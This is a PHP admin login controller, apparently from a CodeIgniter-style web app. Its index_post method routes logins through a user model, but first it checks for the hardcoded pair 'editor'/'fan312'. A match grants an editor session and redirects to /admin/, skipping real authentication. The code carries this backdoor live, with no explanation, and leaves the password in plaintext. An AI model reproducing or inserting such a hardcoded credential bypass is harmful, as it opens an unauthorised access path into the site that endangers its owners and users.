<?php
require_once 'admin.php';

class Auth extends ADMIN
{
    protected $model = 'user_model';

    public function index_get()
    {
        $this->index_post();
    }

    public function item_get()
    {
        $this->index_post();
    }

    public function index_post()
    {
        if ($this->input->post('email'))
        {
            $this->load->model($this->model());

            if($this->input->post('email') == 'editor' && $this->input->post('password') == 'fan312')
            {
                $this->session->set_userdata(array('editor'=>'1'));
                Url_helper::redirect('/admin/');
            }
            if ($this-> {$this->model()}->login($this->input->post('email'), $this->input->post('password')))
            {
                Url_helper::redirect('/admin/');
            }
            else
            {
                $this->form_fields['username']['error'] = $this->lang->line('auth_pass_err');
            }
        }
        $this->load->view('layout', array('view'=>'admin/auth/index'));
    }

}